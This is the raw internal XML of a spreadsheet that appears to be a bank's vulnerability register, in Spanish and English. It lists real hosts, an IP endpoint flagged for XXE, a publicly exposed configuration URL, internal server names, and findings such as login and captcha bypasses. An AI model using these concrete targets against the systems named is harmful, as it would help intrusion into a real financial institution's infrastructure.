    <t>La aplicación no restringe el acceso a ciertos ficheros de configuración internos de la aplicación y/o la plataforma siendo accesibles de manera pública. De esta manera, la información sensible que pudieran contener estos ficheros quedaría expuesta.</t>
  </si>
  <si>
    <t>Se recomienda configurar un nivel de accesos de acceso a la información para proteger los ficheros 
de configuración expuestos, evitando que puedan ser accesibles de manera pública.</t>
  </si>
  <si>
    <t>https://bpm.santanderconsumer.co/Origina
cionPROD/Api/Authentication/BizagiConfig</t>
  </si>
  <si>
    <t>Un atacante podría aprovechar esta vulnerabilidad para obtener más información sobre el sistema 
o el software instalado, pudiendo identificar el tipo de servidor, o versión de software. Esta 
información le permitiría localizar vulnerabilidades existentes en los productos software instalados 
y aprovecharlas para tomar el control del sistema.</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento 
interno del servidor, como pueden ser rutas internas o ubicación de ficheros o directorios dentro 
del mismo. 
Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, 
mensajes de error y/o páginas por defecto.</t>
  </si>
  <si>
    <t>Etiquetas de fila</t>
  </si>
  <si>
    <t>Total general</t>
  </si>
  <si>
    <t>Cuenta de Vulnerability description</t>
  </si>
  <si>
    <t>SLA Vencido</t>
  </si>
  <si>
    <t>domain</t>
  </si>
  <si>
    <t>Func App/Tech Serv ID</t>
  </si>
  <si>
    <t>asset_type</t>
  </si>
  <si>
    <t>environment</t>
  </si>
  <si>
    <t>cid</t>
  </si>
  <si>
    <t>name</t>
  </si>
  <si>
    <t>q_id</t>
  </si>
  <si>
    <t>zt</t>
  </si>
  <si>
    <t>emergency</t>
  </si>
  <si>
    <t>ASSET MANAGEMENT</t>
  </si>
  <si>
    <t>APMF0001064432</t>
  </si>
  <si>
    <t>Server</t>
  </si>
  <si>
    <t>Production</t>
  </si>
  <si>
    <t>CI0497576471</t>
  </si>
  <si>
    <t>dbbanplo22con02</t>
  </si>
  <si>
    <t>PLATFORM ENGINEERING GLUON</t>
  </si>
  <si>
    <t>APMF0001059444</t>
  </si>
  <si>
    <t>CI0440849819</t>
  </si>
  <si>
    <t>dbavaplo22con04</t>
  </si>
  <si>
    <t>UNSPECIFIED</t>
  </si>
  <si>
    <t>CI0234472330</t>
  </si>
  <si>
    <t>SFCP50A</t>
  </si>
  <si>
    <t>CI0431494254</t>
  </si>
  <si>
    <t>BSNCP75BS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</si>
</sst>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yyyy\-mm\-dd"/>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indexed="81"/>
      <name val="Tahoma"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FFFF0000"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <u/>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <u/>
      <sz val="11"/>
      <color theme="10"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <u/>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="8"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Segoe UI"/>
      <family val="2"/>
    </font>
    <font>
      <strike/>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <name val="Aptos Narrow"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="12"/>
      <color rgb="FF242424"/>
      <name val="Aptos"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="12"/>
      <color rgb="FF242424"/>
      <name val="Aptos"/>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rgb="FFECECEC"/>
        <bgColor indexed="64"/>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right style="thin">
        <color theme="0"/>
      </right>
      <top/>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1" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="21" fillId="0" borderId="0" applyNumberFormat="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0"/>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="0"/>
  </cellStyleXfs>
  <cellXfs count="96">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>
    <xf numFmtId="14" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"/>
    <xf numFmtId="0" fontId="13" fillId="33" borderId="10" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="33" borderId="10" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="164" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="14" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="3" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="1" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="1" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="14" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="14" fontId="13" fillId="33" borderId="10" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="33" borderId="11" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="33" borderId="11" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="14" fontId="13" fillId="33" borderId="11" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="35" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="35" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="3" fontId="0" fillId="35" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="35" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="36" borderId="10" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="14" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="14" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="1" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="14" fontId="16" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="34" borderId="10" xfId="43" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="35" borderId="12" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="33" borderId="12" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="49" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="14" fontId="14" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="37" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="164" fontId="0" fillId="37" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" quotePrefix="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="10" xfId="0" quotePrefix="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top"/>
    </xf>
    <xf numFmtId="49" fontId="0" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="3" fontId="0" fillId="35" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="33" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="33" borderId="10" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="3" fontId="0" fillId="35" borderId="10" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="12" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="14" fontId="0" fillId="34" borderId="12" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="12" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="12" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="12" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="1" fontId="0" fillId="34" borderId="12" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="1" fontId="0" fillId="34" borderId="12" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="12" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="33" borderId="13" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="36" borderId="12" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="0" xfId="0" applyFill="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="165" fontId="0" fillId="0" borderId="14" xfId="0" applyNumberFormat="1" applyBorder="1"/>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="12" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="13" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="0" xfId="0" applyFill="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="0" xfId="0" applyFill="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="1" fontId="0" fillId="34" borderId="15" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="14" fontId="0" fillId="34" borderId="0" xfId="0" applyNumberFormat="1" applyFill="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="24" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="14" fontId="25" fillId="34" borderId="10" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="25" fillId="34" borderId="10" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="25" fillId="34" borderId="10" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="14" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="1" fontId="0" fillId="34" borderId="12" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="14" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="0" borderId="0" xfId="43" applyFill="1"/>
    <xf numFmtId="14" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="24" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="0" xfId="44"/>
    <xf numFmtId="0" fontId="0" fillId="34" borderId="0" xfId="0" applyFill="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="35" borderId="10" xfId="43" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="0" borderId="0" xfId="43"/>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21" fillId="0" borderId="0" xfId="43" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" pivotButton="1"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="28" fillId="38" borderId="16" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="38" borderId="16" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
  </cellXfs>
  <cellStyles count="45">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3" builtinId="8"/>
    <cellStyle name="Hipervínculo 2" xfId="42" xr:uid="{00000000-0005-0000-0000-00001F000000}"/>
    <cellStyle name="Incorrecto" xfId="7" builtinId="27" customBuiltin="1"/>
    <cellStyle name="Neutral" xfId="8" builtinId="28" customBuiltin="1"/>
    <cellStyle name="Normal" xfId="0" builtinId="0"/>
    <cellStyle name="Normal 2" xfId="44" xr:uid="{B7F33CBE-2294-4446-97F4-BC57A66645D1}"/>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3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alignment horizontal="center"/>
    </dxf>
    <dxf>
      <alignment vertical="center"/>
    </dxf>
    <dxf>
      <alignment wrapText="1"/>
    </dxf>
  </dxfs>
  <tableStyles count="0" defaultTableStyle="TableStyleMedium2" defaultPivotStyle="PivotStyleLight16"/>
  <colors>
    <mruColors>
      <color rgb="FFECEC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ilera Gonzalez Santiago" refreshedDate="46196.683232175928" createdVersion="8" refreshedVersion="8" minRefreshableVersion="3" recordCount="620" xr:uid="{9C6552C8-E5D1-40DC-BDEB-79E6C3FFCF3F}">
  <cacheSource type="worksheet">
    <worksheetSource ref="A1:AG621" sheet="BSNC"/>
  </cacheSource>
  <cacheFields count="33">
    <cacheField name="#" numFmtId="0">
      <sharedItems containsString="0" containsBlank="1" containsNumber="1" containsInteger="1" minValue="1" maxValue="620"/>
    </cacheField>
    <cacheField name="Company" numFmtId="0">
      <sharedItems/>
    </cacheField>
    <cacheField name="Source" numFmtId="0">
      <sharedItems/>
    </cacheField>
    <cacheField name="Type" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Waiver Code" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Previous Waiver code" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Name of vulnerable asset" numFmtId="0">
      <sharedItems/>
    </cacheField>
    <cacheField name="Internal Identification Code" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Identification Code External" numFmtId="0">
      <sharedItems containsBlank="1"/>
    </cacheField>
    <cacheField name="Vulnerability description" numFmtId="0">
      <sharedItems containsBlank="1" count="239">
        <s v="Vulnerabilidad de directorio transversal"/>
        <s v="Cross Site Request Forgery"/>
        <s v="Debilidad en el mecanismo de CAPTCHA"/>
        <s v="Uso de librerias desactualizadas"/>
        <s v="Revelación de información a través de SSL/TLS (BEAST)"/>
        <s v="Fuga de información de servidor y versión"/>
        <s v="Divulgación de información httpOnly Cookie en el Servidor Apache HTTP"/>
        <s v="Uso de Software desactualizado"/>
        <s v="Uso de cifrado 3DES"/>
        <s v="Módulo SSL/TLS Diffie-Hellman &lt; = 1024 Bits (LogJam)"/>
        <s v="Activo vulnerable a Lucky13 (CVE-2013-0169)"/>
        <s v="Ausencia de Cabecera CSP (Content-security-Policy)"/>
        <s v="Fuga de información de rutas internas"/>
        <s v="Suite de cifrado SSL de 64-bit Soportada (SWEET32)"/>
        <s v="Renegociación segura de SSL iniciada por el cliente"/>
        <s v="Librerías de JavaScript desactualizadas"/>
        <s v="Errores no controlados"/>
        <s v="Librerias de Javascript vulnerables"/>
        <s v="Librerias de Bootstrap vulnerables"/>
        <s v="Información sensible en Metadatos de Ficheros"/>
        <s v="Métodos HTTP no seguros permitidos"/>
        <s v="Fuga de información de aplicación y versión"/>
        <s v="Ausencia de HTTP Strict Transport Security (HSTS)"/>
        <s v="SSL/TLS Server supports TLSv1.0"/>
        <s v="SSL Certificate - Subject Common Name Does Not Match Server FQDN"/>
        <s v="HTTP Security Header Not Detected"/>
        <s v="SSL Certificate Not Signed By A Trusted Authority "/>
        <s v="Network Time Protocol (NTP) Allows Mode 6 Queries "/>
        <s v="Potentially Unnecessary Services "/>
        <s v="SSL Service Uses Expired Certificates "/>
        <s v="Check Point ‘SecuRemote’ Hostname Information Disclosure"/>
        <s v="Cisco IOS IKEv1 Packet Handling Remote Information Disclosure "/>
        <s v="SSL Certificate Signed Using A Weak Hashing Algorithm "/>
        <s v="Internet Key Exchange (IKE) Aggressive Mode With Pre-Shared Key  "/>
        <s v="IPSec IKE Detection "/>
        <s v="System Responds To ICMP ‘Timestamp’ Requests "/>
        <s v="Web Application Includes Files From A Third-Party "/>
        <s v="Web Application Does Not Use ‘HTTPOnly’ Cookies"/>
        <s v="Web Application Can Be Embedded In Third-Party Websites "/>
        <s v="Web Application Discloses Information To Third-Party  "/>
        <s v="Web Application Uses Unsafe Content Disposition For PDF Files  "/>
        <s v="Web Application Uses Insecure Transmission For Login Forms  "/>
        <s v="Web Application Does Not Specify Content Security Policy (CSP) "/>
        <s v="‘Robots.txt’ File Discloses Information"/>
        <s v="‘X-Content-Type-Options’ HTTP Header Not Specified "/>
        <s v="‘X-XSS-Protection’ HTTP Header Not Specified "/>
        <s v="Apache Tomcat Remote Code Execution Vulnerability"/>
        <s v="XXE in https://141.226.106.45/factoringWSOccidente-factoringWSOccidente/ConsultarProductoOcciclienteServiceAction "/>
        <s v="jQuery Prior to 3.4.0 Cross-Site Scripting Vulnerability"/>
        <s v="Versión vulnerable y sin soporte de Richfaces"/>
        <s v="Versión vulnerable de iText"/>
        <s v="Acceso a información de debug"/>
        <s v="Enumeración de usuarios"/>
        <s v="Encabezados ineficaces: Content-Security-Policy, Set-Cookie , Encabezados obligatorios faltantes_x000a_Encabezados http faltantes: Cache-Control"/>
        <s v="Encabezados ineficaces: Content-Security-Policy, Set-Cookie , Encabezados obligatorios faltantes_x000a_Encabezados http faltantes: Content-Security-Policy"/>
        <s v="Encabezados ineficaces: Content-Security-Policy, Set-Cookie , Encabezados obligatorios faltantes_x000a_Encabezados mal configurados: Set-Cookie"/>
        <s v="Path-relative stylesheet import (PRSSI) vulnerability"/>
        <s v="Slow HTTP POST vulnerability"/>
        <s v="Use of JavaScript Library with Known Vulnerability"/>
        <s v="Path-Based Vulnerability"/>
        <s v="HTTP Request Smuggling"/>
        <s v="Robo de sesión por fijación de sesión"/>
        <s v="Posible Denegación de Servicio"/>
        <s v="Inyección del header Host"/>
        <s v="Enumeracion de usuarios"/>
        <s v="X-Frame-Options header is not set"/>
        <s v="Access control issue in the endpoint /reportes/ReporteAmortizacion.seam"/>
        <s v="Access control issues in the endpoints of Intereses reports"/>
        <s v="Captcha Bypass on E-banking online register"/>
        <s v="Access control issues and Application error disclose users, application paths, and application entity data"/>
        <s v="Improper reset password implementation reveals account owners full name on password reset page"/>
        <s v="_x000a_Encabezados de aplicaciones web_x000a_Encabezados ineficaces: Content-Security-Policy"/>
        <s v="Unauthenticated users can bypass login via javascript"/>
        <s v="Cookie Does Not Contain The &quot;HTTPOnly&quot; Attribute"/>
        <s v="Cookie Does Not Contain The &quot;secure&quot; Attribute"/>
        <s v="Session Cookie Does Not Contain the &quot;Secure&quot; Attribute"/>
        <s v="Clickjacking - Framable Page"/>
        <s v="DNSSEC"/>
        <s v="Open Ports"/>
        <s v="TLS ROBOT Vulnerability Detected"/>
        <s v="Possible Scan Interference"/>
        <s v="X Windows Font Server Denial of Service Vulnerability"/>
        <s v="Insecure HTTPS Redirect Pattern"/>
        <s v="Same Site Scripting"/>
        <s v="Broken Access Controls Leading to Privilege Escalation"/>
        <s v="Step-Up Authentication Bypass in SuperNet Profile Page"/>
        <s v="Potentially insecure policy_x000a_Ineffective headers: Content-Security-Policy"/>
        <s v="Certificate Is Expired"/>
        <s v="TLS Padding Oracle Vulnerability (Zombie POODLE and GOLDENDOODLE)"/>
        <s v="Medium Severity CVEs Patching Cadence"/>
        <s v="Medium-Severity Vulnerability in Last Observation"/>
        <s v="Certificate Is Self-Signed"/>
        <s v="Certificate Lifetime Is Longer Than Best Practices"/>
        <s v="Certificate Without Revocation Control"/>
        <s v="Librería desactualizada en uso"/>
        <s v="Debilidades en el esquema de preguntas de seguridad"/>
        <s v="Inadecuado manejo de errores"/>
        <s v="Respuestas HTTPs chacheables"/>
        <s v="Uso de librerías JavaScript vulnerables"/>
        <s v="Inadecuada configuración de seguridad de capa de transporte (TLS)"/>
        <s v="Exposición de información sensible"/>
        <s v="TLS MAC calculation timing attack (LUCKY13)"/>
        <s v="Rate limiter potencialmente no implementado"/>
        <s v="Librerías desactualizadas en uso"/>
        <s v="Enumeración de nombres cortos de archivos y_x000a_directorios de Microsoft"/>
        <s v="Exposición de información potencialmente_x000a_sensible"/>
        <s v="Información interna en metadatos de documentos"/>
        <s v="Enumeración de nombres cortos de archivos y directorios de Microsoft"/>
        <s v="Evasión de captcha"/>
        <s v="Session fixation"/>
        <s v="Mecanismo de autenticación débil"/>
        <s v="Fuga de información de servidor"/>
        <s v="Using vulnerable javascript library"/>
        <s v="Admin Login Page Exposed"/>
        <s v="Cookies sin atributo HttpOnly"/>
        <s v="Renegociación del Handshake en SSL/TLS"/>
        <s v="Inadecuada configuración de la política CSP (Content-Security-Policy)"/>
        <s v="Errores no controlados por la aplicación"/>
        <s v="Cookies sin atributo secure"/>
        <s v="Vulnerabilidad tipo BREACH en compresión HTTP"/>
        <s v="Software Zoom Indexer desactualizado"/>
        <s v="Server Error Message"/>
        <s v="Vulnerable JavaScript Library Detected - jQuery"/>
        <s v="Predictable Resource Location Via Forced Browsing"/>
        <s v="Weak IPsec Encryption Settings"/>
        <s v="HTTP Host Header Injection"/>
        <s v="Unauthenticated/Open Web Proxy Detected (External)"/>
        <s v="Múltiples métodos HTTP permitidos"/>
        <s v="Información sensible en el banner del Servidor Web"/>
        <s v="Posibilidad de mailing masivo"/>
        <s v="Login susceptible a ataques de fuerza bruta"/>
